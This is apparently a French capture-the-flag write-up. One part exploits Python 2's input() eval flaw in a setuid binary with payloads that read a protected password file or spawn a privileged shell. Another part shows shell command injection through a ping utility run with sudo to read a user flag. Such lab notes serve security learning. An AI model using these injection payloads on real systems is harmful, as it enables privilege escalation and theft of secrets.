### Injection python
Code source

1. #!/usr/bin/python2
2.  
3. import sys
4.  
5. def youLose():
6.     print "Try again ;-)"
7.     sys.exit(1)
8.  
9.  
10. try:
11.     p = input("Please enter password : ")
12. except:
13.     youLose()
14.  
15.  
16. with open(".passwd") as f:
17.     passwd = f.readline().strip()
18.     try:
19.         if (p == int(passwd)):
20.             print "Well done ! You can validate with this password !"
21.     except:
22.         youLose()


Comme expliqué dans les précédentes solutions la faille se trouve à ce niveau :
p = input("Please enter password : ")
 puisque dans python2, input(x) = eval(raw_input(x)) ce qui implique que la fonction eval(x) exécutera
 les entrées utilisateurs, ce qui nous intéresse beaucoup.
Voici ma commande pour obtenir le flag :
1. shell6@challenge02:~$ ./setuid-wrapper
2. Please enter password : __import__('os').system('cat /challenge/shell/shell6/.passwd > /tmp/flag')
3. Try again ;-)
4. shell6@challenge02:~$ cat /tmp/flag
5. LE_FLAG_DU_CHALLENGE


Voici un deuxième exemple de commande mais avec une fonction différente :
1. shell6@challenge02:~$ ./setuid-wrapper
2. Please enter password : __import__('shutil').copyfile('/challenge/shell/shell6/.passwd', '/tmp/flag2')
3. Try again ;-)
4. shell6@challenge02:~$ cat /tmp/flag2
5. LE_FLAG_DU_CHALLENGE


On peut également obtenir un shell, pour ensuite inspecter directement le fichier .passwd :
1. shell6@challenge02:~$ ./setuid-wrapper
2. Please enter password : __import__('os').system('sh')
3. sh-4.2$ id
4. uid=1042(shell6) gid=1042(shell6) euid=1043(shell6cracked) groupes=1043(shell6cracked),100(users),1042(shell6)
5. sh-4.2$ cat .passwd
6. LE_FLAG_DU_CHALLENGE
7. sh-4.2$ exit
8. Try again ;-)
9. 



================================================================
os.command( "ping" + var )

jouer avec les parenthèse comme:

$(/bin/bash) 

exemple:
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
    <do -u pepper /var/www/Admin-Utilities/simpler.py -p
    ***********************************************
         _                 _
     ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
    / __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
    \__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
    |___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                    |_|               |_|    |___/
                                    @ironhackers.es

    ***********************************************

    Enter an IP: $(cat ~/user.txt)
    ping: 2afa36c4f05b37b34259c93551f5c44f: Temporary failure in name resolution

=================================================================






